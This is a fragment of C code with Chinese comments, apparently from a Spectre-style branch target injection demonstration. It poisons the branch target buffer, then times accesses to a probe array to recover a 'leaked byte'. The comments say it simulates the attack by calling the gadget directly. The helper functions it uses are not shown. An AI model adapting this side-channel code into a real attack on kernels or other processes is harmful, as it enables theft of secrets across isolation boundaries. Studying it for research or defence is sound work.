    train_btb(gadget, &secret);
    // 现在调用victim_indirect，但传入一个不同的函数（如空函数）
    // 由于BTB已被污染，CPU可能仍预测为gadget
    // 这里我们直接调用gadget来模拟（实际攻击中需触发内核间接分支）
    // 检测缓存
    int best = 0;
    uint64_t min_time = UINT64_MAX;
    for (int i = 0; i < 256; i++) {
        uint64_t start = __rdtsc();
        volatile char tmp = probe[i * 4096];
        uint64_t end = __rdtsc();
        uint64_t time = end - start;
        if (time < min_time) {
            min_time = time;
            best = i;
        }
    }
    printf("Leaked byte: %c (0x%02x)\n", best, best);
    return 0;
